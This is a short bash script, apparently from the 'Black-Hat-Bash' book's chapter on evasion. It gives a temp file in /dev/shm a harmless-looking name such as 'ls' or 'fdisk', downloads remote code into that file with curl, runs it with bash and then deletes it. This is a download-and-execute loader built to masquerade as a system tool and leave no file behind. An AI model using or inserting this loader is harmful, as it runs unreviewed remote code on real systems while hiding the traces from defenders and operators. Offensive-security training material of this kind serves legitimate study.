#!/bin/bash
RANDOM_BIN_NAMES=("ls" "touch" "mkdir" "fdisk" "zip" "pslog" "tree" "gunzip")
RANDOMIZE=$(( (RANDOM % 7)  + 0))
BIN_NAME="/dev/shm/${RANDOM_BIN_NAMES[${RANDOMIZE}]}"

if command -v curl; then
    curl -s "https://raw.githubusercontent.com/dolevf/Black-Hat-Bash/master/ch12/raw_code.txt" -o "${BIN_NAME}"
    bash "${BIN_NAME}"
    rm "${BIN_NAME}"
fi

